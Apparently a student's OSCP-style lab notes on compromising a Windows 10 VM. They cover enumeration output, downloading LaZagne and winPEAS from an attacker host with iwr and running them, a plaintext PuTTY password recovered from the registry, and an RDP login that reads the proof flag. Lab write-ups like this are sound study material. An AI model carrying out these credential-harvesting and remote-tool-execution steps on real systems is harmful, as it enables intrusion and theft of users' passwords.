+Host Name:                 OSCP
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19041 N/A Build 19041
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          zachary
+Registered Organization:   
+Product ID:                00331-10000-00001-AA514
+Original Install Date:     1/5/2023, 6:10:42 AM
+System Boot Time:          3/30/2024, 5:05:31 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+
+
+				NETWORK:
+PS C:\Users\offsec\Desktop> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : oscp
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-DC-3B
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.214.145(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254
+   DNS Servers . . . . . . . . . . . : 192.168.214.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+PS C:\Users\offsec\Desktop> route print
+===========================================================================
+Interface List
+ 14...00 50 56 ab dc 3b ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+===========================================================================
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0  192.168.214.254  192.168.214.145     16
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+    192.168.214.0    255.255.255.0         On-link   192.168.214.145    271
+  192.168.214.145  255.255.255.255         On-link   192.168.214.145    271
+  192.168.214.255  255.255.255.255         On-link   192.168.214.145    271
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link   192.168.214.145    271
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link   192.168.214.145    271
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0  192.168.214.254       1
+===========================================================================
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    331 ::1/128                  On-link
+  1    331 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+PS C:\Users\offsec\Desktop> nslookup
+Default Server:  UnKnown
+Address:  192.168.214.254
+
+
+				CREDS: 
+#Powershell password hunting:
+PS C:\Users\offsec\Desktop> (Get-PSReadlineOption).HistorySavePath
+C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+logoff
+
+# LaZagne:
+python3 -m http.server 80
+iwr -uri http://192.168.45.229:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+########## User: offsec ##########
+------------------- Credman passwords -----------------
+[+] Password found !!!
+URL: XboxLive
+Login: None
+Password: b'ECS2 ~I<\xd0\x11\x96\x03\x173\xccI\x90\xa5B\xed\x1d\xcaC\x92\x9a\xa4\xfc\x97p\xbb\xa1\x94\xf9\x07\xe9q\xb5\x90$U\xed\x18j\x03\xbb\x02/\xff\xf5Z\x14\x07l/\xbe\xc8\xed\xd5\x9a)\x82T><]\x13pT\x83XY_\x93\xa4\xf2f\xda\x1c.\x0bV\xf1L\xdc\xc8\xbfL3\x1b\xc6\x7fG\xdd\xf4S\x99.\x9a\xf6\xd7'
+
+
+				FILES OF INTEREST:
+Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+    Directory: C:\Users\offsec\Desktop
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          5/5/2024   5:47 PM             34 local.txt  
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
+
+
+
+				PRIV ESC: 
+
+PS C:\Users\offsec\Desktop> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+
+# WINPEAS: 
+python3 -m http.server 80
+iwr -uri http://192.168.45.229:80/winPEASx64.exe -Outfile winpea.exe
+.\winpea.exe
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 2004 (19041)
+ [*] Enumerating installed KBs...
+ [!] CVE-2020-1013 : VULNERABLE
+  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/                                                                   
+ [*] Finished. Found 1 potential vulnerabilities.
+
+          ͹ Checking Credential manager
+   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                             
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+     Username:              
+     Password:              (Unicode Base64 encoded) RUNTMiAAAAB+STzQEZYDFzPMSZClQu0dykOSmqT8l3C7oZT5B+lxtZAkVQDtGGoDuwIv//VaFAdsL77I7dWaKYJUPjxdE3BUg1hZX5Ok8mbaHC4LVvH9/8i/TDMbxn9H3fRTmS6a9tc=
+     Target:                XboxLive
+     PersistenceType:       Session
+     LastWriteTime:         5/5/2024 5:52:00 PM
+
+                                   ͹ Interesting files and registry                                                                                                                               
+          ͹ Putty Sessions
+    RegKey Name: zachary
+    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+
+
+				RDP: proof.txt
+CREDS:
+zachary:Th3R@tC@tch3r
+
+Files and Registry (Credentials): 
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials
+Putty Creds: Recall snmp showed installed softwares, mostly putty saves the login credentials.
+
+┌──(kali㉿kali)-[~/Desktop/A/145]
+└─$ xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.214.145
+
+C:\Users\Administrator\Desktop\proof.txt
+87a339bcf7b05793e1d0524b45747a62
+
+
+--------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------
